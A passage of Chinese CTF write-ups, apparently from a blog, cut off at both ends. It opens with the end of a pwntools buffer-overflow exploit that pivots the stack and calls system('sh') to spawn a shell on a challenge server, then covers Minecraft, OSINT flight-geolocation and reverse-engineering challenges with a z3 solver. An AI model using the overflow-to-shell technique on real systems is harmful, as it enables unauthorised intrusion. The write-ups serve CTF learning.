class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r_leak_libc_32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = connect()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to H&amp;amp;NCTF, my friend. What&amp;#x27;s your name?&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak = u32(r(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf_addr = leak - (&lt;span class=&#34;number&#34;&gt;0xfff93748&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xfff93710&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;success(&lt;span class=&#34;string&#34;&gt;f&amp;quot;buf_addr -&amp;gt;&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(buf_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read = elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = &lt;span class=&#34;number&#34;&gt;0x08048639&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bss = &lt;span class=&#34;number&#34;&gt;0x804a000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;number&#34;&gt;0x0804857D&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(read) + p32(vuln) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(bss) + p32(&lt;span class=&#34;number&#34;&gt;0x4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;) + p32(buf_addr - &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time.sleep(&lt;span class=&#34;number&#34;&gt;0.3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# g(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;sh;\0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to H&amp;amp;NCTF, my friend. What&amp;#x27;s your name?&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf_addr = buf_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;success(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(buf_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf_addr = buf_addr - (&lt;span class=&#34;number&#34;&gt;0xffb45f80&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xffb45f4c&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(system) + p32(bss) + p32(bss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;) + p32(buf_addr - &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# g(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后得到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;H&amp;amp;NCTF&amp;#123;06b0540d-df19-4b49-9e63-fb7b8b67f8f9&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;misc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc:&lt;/h1&gt;
&lt;h2 id=&#34;mancraft-娱乐题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mancraft-娱乐题&#34;&gt;#&lt;/a&gt; ManCraft - 娱乐题:&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	一个我的世界的服务器，下载1.20.4版本之后进入服务器，根据提示，先绑定队伍的token，之后迅速发育，然后勾引金甲僵尸，也就是劳大，把它勾引到陷阱里杀死，然后就能够拿到一个key，之后用这个key就能拿到flag。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/cf711c6120000fcbd5528f8372572795.png&#34; alt=&#34;Screenshot 2024-05-12 155018.png&#34;&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/6bb03b4ea780a0a6b4dc67a0ebe6dd84.png&#34; alt=&#34;Screenshot 2024-05-12 155005.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;osint复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#osint复现&#34;&gt;#&lt;/a&gt; osint（复现）:&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2024/png/40657236/1715697250053-b7fdda5d-d8ab-4b18-a755-6db500b7bdd7.png?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2024%2Fpng%2F40657236%2F1715697250053-b7fdda5d-d8ab-4b18-a755-6db500b7bdd7.png%22%2C%22name%22%3A%22onist.png%22%2C%22size%22%3A2019609%2C%22ext%22%3A%22png%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22ud35684a1-da6c-44d5-a196-b58c551a160%22%2C%22taskType%22%3A%22upload%22%2C%22type%22%3A%22image%2Fpng%22%2C%22__spacing%22%3A%22both%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u02b21b9c%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D&#34;&gt;onist.png&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/c34220ecf9f8203e1a39b8eddee930af.png&#34; alt=&#34;onist.png&#34;&gt;&lt;br&gt;
 溯源的题，一张图片，光是图片来看，似乎只有两种可能，起飞或者降落，又因为题目要求我们输入目的地，所以，如果是难度不高的话，这儿应该是目的地。&lt;br&gt;
检查图片属性，发现这张照片最后依次的修改时间是 4 月 23 日下午 3 点多，这张照片很明显是晚上拍摄的，所以，照例来说，这张图应该是在之前的晚上拍摄的，所以，先从 4 月 22 日晚上到 23 日凌晨的航班来看。&lt;br&gt;
另外，根据机翼上红色的那个红色的图，在网上找到了应该是海南航空的飞机，且左边数字，有个 22，大概推测注册号是 X-22XX，左边的字母，好像是根据国家不同定的，中国的是 B。&lt;br&gt;
之后，搜索注册号为 B-22，能够知道有几个：&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/04d6e4cf5081298b258bc0551c176f39.png&#34; alt=&#34;Screenshot 2024-05-14 230753.png&#34;&gt;&lt;br&gt;
 之后，通过搜索 4 月 22 日晚上到 4 月 23 日凌晨那段时间的海南航空的飞机，大致可以得到航班号为 HU7006。&lt;br&gt;
拿到了航班之后，通过航班和时间搜索，能搜到起始地和目的地，目的地是海口美兰国际机场。&lt;br&gt;
最后，感觉运气使然，在机场附近遇到个有点眼熟的路的弧度，抱着试一试的想法，把地址写上去，结果正确了：&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/1e47424f573bfa5881e1c1ca5ccdbc13.png&#34; alt=&#34;Screenshot 2024-05-14 231654.png&#34;&gt;&lt;br&gt;
 最后 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;H-NCTF&amp;#123;ae53219d0966&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;re&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re&#34;&gt;#&lt;/a&gt; Re&lt;/h1&gt;
&lt;h2 id=&#34;最喜欢的逆向题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最喜欢的逆向题&#34;&gt;#&lt;/a&gt; 最喜欢的逆向题&lt;/h2&gt;
&lt;p&gt;签到题&lt;br&gt;
 v1=a1 [5]=105&lt;br&gt;
64 位&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/6aecae5c25ab966f7031681129163ad1.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/9a680c7b9571f95c95e3387981104837.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;imagepng&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#imagepng&#34;&gt;#&lt;/a&gt; &lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/126e38404d285530ded60d084a24f164.png&#34; alt=&#34;image.png&#34;&gt;&lt;/h2&gt;
&lt;h2 id=&#34;hnwna&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hnwna&#34;&gt;#&lt;/a&gt; hnwna&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/1e45abae7e7b19ba49bf20024e72dcb7.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 一个 CSharp 写的小游戏&lt;br&gt;
方法一：&lt;br&gt;
用 ILSPY 打开下面的文件&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/e3cd66f1b87fdd0bf564ea75d5a30156.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 搜索找到关键函数了（一开始搜索区域不对，导致找不到关键函数）&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/47014959c6e7273ea815c97eeb7e218c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;函数 a 为凯撒，if 判断那里移位为 5&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/1bae176c78c6cdaa6215f186e6a11ef8.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 加密&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/6c27a0a6a4f7087be4e37c1833102ae7.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 方法二：dnspy，类似于破解&lt;/p&gt;
&lt;h2 id=&#34;do-you-know-swddwait&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#do-you-know-swddwait&#34;&gt;#&lt;/a&gt; DO YOU KNOW SWDD?（wait）&lt;/h2&gt;
&lt;p&gt;32 位打开 ida，出现 SMC。&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/ed5d966cbed038fecbb66e8ec4e749c6.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 动态调试&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/e690d825722feb18cba7e78cb45b899c.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 在导入表中有 virtualprotect 函数，这里对内存权限进行了修改，大概率是 SMC。&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/23f0e00acb661a123f7a56a687cce303.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 看 41127B 函数 (断点位置下错了，照着 wp 都能错，服了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/5c2fffc54e63b92ab40b173a92efc026.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 看 4113D9&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/c71af45348c34fc31f3a6dd8a76c1a42.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/1282a4aa673fd5c21742692aaa5e44e1.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
p 然后 f5&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/fadbd50ad886b850ef2f02097879bfc2.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 可知是凯撒移位 10 位&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/0c76881393aa4b6938c1c4e751019f5d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;childmaze&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#childmaze&#34;&gt;#&lt;/a&gt; childmaze&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/6b52a1d3bffc480f56e4e4e9438960f9.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 迷宫问题&lt;br&gt;
方法一：静态分析&lt;br&gt;
找到关键数据部分（不易找到），交叉引用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s = &amp;quot;H&amp;#x27;L@PC&amp;#125;Ci625`hG2]3bZK4&amp;#123;1~&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(len(s)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(chr(ord(s[i]) ^ (i % 7)), end=&amp;quot;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;方法二：调试&lt;br&gt;
在判断跳转的时候下个断点修改 zf 标识符或者改为 jnz 都能实现直接输出 flag&lt;br&gt;
emmIDA 版本问题吧，识别不出 rust。。。。&lt;/p&gt;

 &lt;p&gt;比赛时间：2024-05-06&lt;/p&gt;
&lt;h2 id=&#34;re-easyre&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re-easyre&#34;&gt;#&lt;/a&gt; Re-easyre&lt;/h2&gt;
&lt;p&gt;基本的 base64 换表，用 CyberChef 解密&lt;/p&gt;
&lt;h2 id=&#34;图片png&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#图片png&#34;&gt;#&lt;/a&gt; &lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/98e1f9771361bda19e93bee54d1a2e3f.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/h2&gt;
&lt;h2 id=&#34;re-babyre&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re-babyre&#34;&gt;#&lt;/a&gt; Re-babyre&lt;/h2&gt;
&lt;p&gt;进入主函数，发现输入四次 看一下就知道是大数求解&lt;br&gt;
 (当初写的时候差不多 不知道为什么第四个总是算错…)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; z3 &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = Solver()  &lt;span class=&#34;comment&#34;&gt;# 设置一个解方程的类Solver(必须要设置）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v5=BitVec(&lt;span class=&#34;string&#34;&gt;&amp;#x27;v5&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v6=BitVec(&lt;span class=&#34;string&#34;&gt;&amp;#x27;v6&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v7=BitVec(&lt;span class=&#34;string&#34;&gt;&amp;#x27;v7&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8=BitVec(&lt;span class=&#34;string&#34;&gt;&amp;#x27;v8&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add(v5 + &lt;span class=&#34;number&#34;&gt;1380855784&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;907301700&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add((v6 | &lt;span class=&#34;number&#34;&gt;0x8E03BEC3&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * (v6 &amp;amp; &lt;span class=&#34;number&#34;&gt;0x71FC413C&lt;/span&gt;) + v6 == -&lt;span class=&#34;number&#34;&gt;1876131848&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add(v7&amp;lt;=&lt;span class=&#34;number&#34;&gt;0x10000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * ((~v7 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * ~(~v7 | &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + -&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * (~v7 | &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * ~(v7 | &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     - (-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; * (v7 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      + (v7 ^ &lt;span class=&#34;number&#34;&gt;0xA8453437&lt;/span&gt;)) == &lt;span class=&#34;number&#34;&gt;551387557&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add(v8&amp;lt;=&lt;span class=&#34;number&#34;&gt;0x10000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.add(&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; * ~(v8 ^ &lt;span class=&#34;number&#34;&gt;0xE33B67BD&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * ~(~v8 | &lt;span class=&#34;number&#34;&gt;0xE33B67BD&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     - (&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; * (v8&amp;amp; &lt;span class=&#34;number&#34;&gt;0xE33B67BD&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      + &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; * ~(v8 | &lt;span class=&#34;number&#34;&gt;0xE33B67BD&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * (v8 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xD2C7FC0C&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + -&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; * v8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * ~(v8 | &lt;span class=&#34;number&#34;&gt;0xD2C7FC0C&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + ~(v8 | &lt;span 